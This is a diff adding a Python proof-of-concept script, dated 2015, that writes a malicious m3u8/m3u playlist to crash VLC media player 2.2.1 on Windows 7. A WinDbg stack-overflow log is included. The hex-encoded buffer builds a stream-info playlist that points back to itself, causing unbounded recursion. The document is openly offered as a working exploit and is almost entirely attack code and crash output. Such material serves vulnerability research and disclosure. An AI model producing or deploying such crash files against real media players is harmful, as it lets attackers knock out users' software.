@@ -1,0 +1,69 @@
+#!/usr/bin/python
+
+#
+
+# VLC media player 2.2.1 m3u8/m3u Crash Proof Of Concept
+
+#
+
+# Author: Naser Farhadi
+
+#
+
+# Date: 25 August 2015 # Version: 2.2.1 # Tested on: Windows 7 SP1 (32 bit)
+
+#
+
+##
+
+
+
+"""
+
+ModLoad: 71ae0000 71b64000   C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.17514_none_ec83dffa859149af\comctl32.dll
+
+httplive stream: HTTP Live Streaming (/C:/Users/test/Desktop/crash.m3u8)
+
+ModLoad: 6c610000 6c622000   C:\Program Files\VideoLAN\VLC\plugins\meta_engine\libfolder_plugin.dll
+
+(e38.554): Stack overflow - code c00000fd (first chance)
+
+First chance exceptions are reported before any exception handling.
+
+This exception may be expected and handled.
+
+eax=00000000 ebx=04234238 ecx=04234138 edx=6ef83100 esi=6ef83124 edi=00000000
+
+eip=7541694b esp=04233000 ebp=06e6b4ac iopl=0         nv up ei pl zr na pe nc
+
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+
+KERNELBASE!FlsGetValue+0x2:
+
+7541694b 55              push    ebp
+
+"""
+
+
+
+filename = "crash.m3u8" # Or .m3u
+
+buffer = ("\x23\x45\x58\x54\x4d\x33\x55\r\n\x23"
+
+          "\x45\x58\x54\x2d\x58\x2d\x53\x54\x52"
+
+          "\x45\x41\x4d\x2d\x49\x4e\x46\x3a\x50"
+
+          "\x52\x4f\x47\x52\x41\x4d\x2d\x49\x44"
+
+          "\x3d\x31\x2c\x42\x41\x4e\x44\x57\x49"
+
+          "\x44\x54\x48\x3d\x31\x2c\x52\x45\x53"
+
+          "\x4f\x4c\x55\x54\x49\x4f\x4e\x3d\x31"
+
+          "\x32\x30\x78\x33\x36\x30\r\n")
+
+buffer += filename
+
+open(filename, "wb").write(buffer)
